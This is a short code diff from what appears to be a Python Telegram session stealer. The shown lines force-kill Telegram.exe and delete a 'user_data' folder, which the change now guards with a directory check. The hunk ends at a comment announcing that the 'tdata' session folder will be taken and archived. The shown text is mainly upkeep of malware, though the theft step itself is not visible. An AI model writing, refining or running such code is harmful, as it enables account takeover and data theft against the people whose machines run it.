@@ -53,7 +53,8 @@ os.system('taskkill /f /im Telegram.exe')
 #delete no use files
 folder_path = os.path.join(user, 'user_data')
 time.sleep(2)
-shutil.rmtree(folder_path)
+if os.path.isdir(folder_path) == True:
+    shutil.rmtree(folder_path)
 #delete no use files end
 
 # tdata take + archivation
